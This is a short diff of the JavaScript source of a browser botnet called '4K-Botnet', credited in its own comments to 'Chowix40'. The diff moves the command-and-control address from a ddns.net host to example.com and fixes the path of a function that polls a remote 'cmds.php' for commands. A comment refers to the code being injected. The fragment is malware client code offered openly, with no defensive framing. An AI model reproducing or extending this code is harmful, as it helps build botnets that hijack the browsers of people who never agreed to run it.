@@ -1,6 +1,6 @@
 //4K-Botnet v0.1 by Chowix40
 //I know it's crap but it works (Kinda)
-var SERVER_URL = 'http://4k-server.ddns.net/4K-Botnet/'
+var SERVER_URL = 'http://example.com/Botnet/'
 //console.log('4K-Botnet v0.1 by Chowix40')
 
 //Stage 0 - Shows it's been injected
@@ -15,7 +15,7 @@ var SERVER_URL = 'http://4k-server.ddns.net/4K-Botnet/'
 function getCMD() {
 var oReqcmd = new XMLHttpRequest();    
 oReqcmd.addEventListener("load", reqListener);
-oReqcmd.open("GET", SERVER_URL+"/cmds.php");
+oReqcmd.open("GET", SERVER_URL+"cmds.php");
 oReqcmd.send(null);
 
 function reqListener() {
